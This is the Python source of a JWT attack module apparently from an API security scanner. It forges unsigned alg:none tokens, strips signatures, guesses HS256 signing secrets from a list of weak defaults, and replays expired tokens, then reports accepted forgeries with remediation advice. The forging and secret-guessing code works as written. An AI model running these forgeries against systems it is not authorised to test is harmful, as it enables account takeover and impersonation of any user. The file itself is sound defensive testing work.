"""JWT attack scanner (BRAIN.md D9).

Runs once against the first authenticated GET endpoint (idempotent, so it is
safe to probe repeatedly). Using the real session token's payload it forges
variants and flags any the server *accepts*
(distinguished from a garbage-token baseline):

* ``alg:none`` — an unsigned token.
* signature strip — the real token with its signature removed.
* weak-secret forgery — the payload re-signed HS256 with each secret from a
  wordlist; acceptance means the signing secret is guessable and tokens can be
  forged for any user.
* expired replay — once a secret is known, a token with a past ``exp`` to test
  whether expiry is enforced.

JWTs are built with the standard library only (base64 + hmac + hashlib) — no new
dependency.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
from pathlib import Path
from typing import Any

from apiguard.core.http_engine import build_request
from apiguard.core.models import Endpoint, Finding, Severity
from apiguard.scanners.base import Scanner

_DEFAULT_SECRETS = [
    "random", "secret", "changeme", "password", "123456", "admin",
    "jwt_secret", "your-256-bit-secret", "supersecret", "key", "vampi", "test",
]


def _b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def _b64url_decode(segment: str) -> bytes:
    return base64.urlsafe_b64decode(segment + "=" * (-len(segment) % 4))


def _encode_segment(obj: dict) -> str:
    return _b64url(json.dumps(obj, separators=(",", ":")).encode())


def token_payload(token: str) -> dict:
    """Decode a JWT's payload segment (no verification)."""
    return json.loads(_b64url_decode(token.split(".")[1]))


def forge_hs256(payload: dict, secret: str, header: dict | None = None) -> str:
    header = header or {"alg": "HS256", "typ": "JWT"}
    signing_input = f"{_encode_segment(header)}.{_encode_segment(payload)}"
    signature = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
    return f"{signing_input}.{_b64url(signature)}"


def forge_none(payload: dict) -> str:
    return f"{_encode_segment({'alg': 'none', 'typ': 'JWT'})}.{_encode_segment(payload)}."


def strip_signature(token: str) -> str:
    return token.rsplit(".", 1)[0] + "."


def _load_secrets() -> list[str]:
    path = Path(__file__).resolve().parents[2] / "wordlists" / "jwt_secrets.txt"
    if path.is_file():
        secrets = [
            line.strip()
            for line in path.read_text(encoding="utf-8").splitlines()
            if line.strip() and not line.lstrip().startswith("#")
        ]
        if secrets:
            return secrets
    return list(_DEFAULT_SECRETS)


def _slug(*parts: str) -> str:
    return re.sub(r"[^a-z0-9]+", "-", "-".join(parts).lower()).strip("-")


class JwtScanner(Scanner):
    name = "jwt"
    owasp_id = "API2:2023"  # Broken Authentication

    def __init__(self, context, *, secret_wordlist: list[str] | None = None) -> None:
        super().__init__(context)
        self._secrets = secret_wordlist if secret_wordlist is not None else _load_secrets()
        self._ran = False

    def _primary_session(self):
        sessions = self.context.sessions or {}
        return sessions.get("userA") or next(iter(sessions.values()), None)

    async def run(self, endpoint: Endpoint) -> list[Finding]:
        if self._ran:
            return []
        # Probe only an authenticated, idempotent GET: repeated forged-token
        # requests to a create/update endpoint change state and confound the
        # accept-vs-reject comparison.
        if not endpoint.security or endpoint.method.upper() != "GET":
            return []
        session = self._primary_session()
        if session is None:
            return []
        self._ran = True
        return await self._attack(endpoint, session)

    async def _attack(self, endpoint: Endpoint, session) -> list[Finding]:
        payload: dict[str, Any] = token_payload(session.token)

        authed = (await self._send(endpoint, session.token)).status
        rejected = (await self._send(endpoint, "invalid.invalid.invalid")).status
        if authed in (401, 403) or authed == rejected:
            return []  # cannot tell acceptance from rejection here

        def accepted(status: int) -> bool:
            return status == authed and status not in (401, 403)

        findings: list[Finding] = []

        none_ex = await self._send(endpoint, forge_none(payload))
        if accepted(none_ex.status):
            findings.append(self._finding(endpoint, none_ex, "alg-none",
                "The server accepts an unsigned token (alg=none).", Severity.CRITICAL, 0.95))

        strip_ex = await self._send(endpoint, strip_signature(session.token))
        if accepted(strip_ex.status):
            findings.append(self._finding(endpoint, strip_ex, "sig-strip",
                "The server accepts a token with its signature removed.", Severity.HIGH, 0.9))

        for secret in self._secrets:
            ex = await self._send(endpoint, forge_hs256(payload, secret))
            if accepted(ex.status):
                findings.append(self._finding(endpoint, ex, "weak-secret",
                    f"The JWT signing secret is guessable ({secret!r}); an attacker can forge "
                    f"tokens for any user (including admins).", Severity.CRITICAL, 0.95))
                # Expired token derived deterministically from the token's own iat
                # (shifted into the past) — no wall-clock, so scans are reproducible
                # and replay from a cassette matches (invariant 3).
                issued = int(payload.get("iat", 0))
                expired = {**payload, "iat": issued - 7200, "exp": issued - 3600}
                exp_ex = await self._send(endpoint, forge_hs256(expired, secret))
                if accepted(exp_ex.status):
                    findings.append(self._finding(endpoint, exp_ex, "expired-replay",
                        "An expired but validly-signed token is accepted (expiry not enforced).",
                        Severity.MEDIUM, 0.85))
                break

        return findings

    async def _send(self, endpoint: Endpoint, token: str):
        method, url, headers, query, body = build_request(
            endpoint, self.base_url, headers={"Authorization": f"Bearer {token}"}
        )
        return await self.engine.send(method, url, headers=headers, params=query, body=body)

    def _finding(self, endpoint, exchange, kind, description, severity, confidence) -> Finding:
        return Finding(
            id=_slug("jwt", kind, endpoint.method, endpoint.path),
            title=f"JWT weakness ({kind}) on {endpoint.method} {endpoint.path}",
            scanner=self.name,
            endpoint=endpoint,
            severity=severity,
            owasp_id=self.owasp_id,
            confidence=confidence,
            description=description,
            remediation=(
                "Use a long, random, secret signing key; pin the accepted algorithm "
                "(reject 'none'); require and verify a signature and the exp claim."
            ),
            evidence=exchange.evidence,
        )
